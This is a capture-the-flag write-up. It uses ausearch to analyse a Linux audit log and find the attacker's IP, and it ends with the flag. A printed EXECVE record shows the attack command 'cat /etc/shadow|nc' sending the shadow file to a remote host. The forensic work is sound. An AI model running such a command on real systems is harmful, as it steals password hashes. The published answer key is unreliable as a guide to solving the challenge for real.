
# I SEe You 

* **Category**: Miscellaneous
* **Points**: 200
* **Challenge**:   We think someone has been attacking our web server, can you help us by finding the IP address of the attacker in our logs? audit.log.gz.
* **Hint #1:** The flag is the IP address of the attacker without any prefixes or braces around it.
* **Hint #2:** Audit logs can be read via the [ausearch](https://linux.die.net/man/8/ausearch) command.

<br />

I started by opening the audit log using ausearch and looking for uniq IP addresses:
```
ausearch -if audit.log | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | sort | uniq -c

    72 10.0.2.15
   2958 10.0.2.2
      1 2.4.17.1
```

<br />

None of these IP addresses were the the IP were IP we are looking for.  Further research into ausearch suggested that we look at [record types](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/6/html/security_guide/sec-audit_record_types), also reffered to as events.  We also need to us the `-i` option to interpret numeric entities into text.  Lets look at a SOCKADDR record (contains a socket address) using `-m` with and without `-i`:
```
type=SOCKADDR msg=audit(1574163054.175:4519): saddr=02000050000000000000000000000000

# with interpretation:

ausearch -if audit.log -i -m SOCKADDR

type=SOCKADDR msg=audit(11/19/2019 06:30:54.175:4519) : saddr={ fam=inet laddr=0.0.0.0 lport=80 } 
```
<br />

Now that we know how to view IP addresses, we can dig into the record types.  I grabbed all the unique record types and sent them to a file:
```
ausearch -if audit.log | awk {'print $1'} > records.txt
```

<br />

Reasearching each record type, I found the EXECVE record of particular interest.   This is triggered to record arguments of the execve(2) system call, which is a function used to execute a binary executable or a script.  Lets take a look at these records: 
```
ausearch -if audit.log -m EXECVE -i

...<snip>...

type=PROCTITLE msg=audit(11/19/2019 06:31:30.007:46336) : proctitle=/bin/python3 server.py 
type=PATH msg=audit(11/19/2019 06:31:30.007:46336) : item=1 name=/lib64/ld-linux-x86-64.so.2 inode=6204 dev=08:01 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:ld_so_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=PATH msg=audit(11/19/2019 06:31:30.007:46336) : item=0 name=/bin/sh inode=100737155 dev=08:01 mode=file,755 ouid=root ogid=root rdev=00:00 obj=system_u:object_r:shell_exec_t:s0 objtype=NORMAL cap_fp=none cap_fi=none cap_fe=0 cap_fver=0 
type=CWD msg=audit(11/19/2019 06:31:30.007:46336) :  cwd=/vagrant/website 
type=EXECVE msg=audit(11/19/2019 06:31:30.007:46336) : argc=3 a0=/bin/sh a1=-c a2=cat /etc/shadow|nc 44.68.139.241 3333 
type=SYSCALL msg=audit(11/19/2019 06:31:30.007:46336) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7f44c0c15870 a1=0x7f44c0b20930 a2=0x7ffeac0bfa60 a3=0x7f44cee4a770 items=2 ppid=2628 pid=5403 auid=ftpuser uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=sh exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null) 

...snip...
```

We can see from this record that on 11/19, someone attempted to send the contents of the /etc/shadow file to 44.68.139.241 3333 using netcat.  

<br />

## Flag: ACI{44.68.139.241}
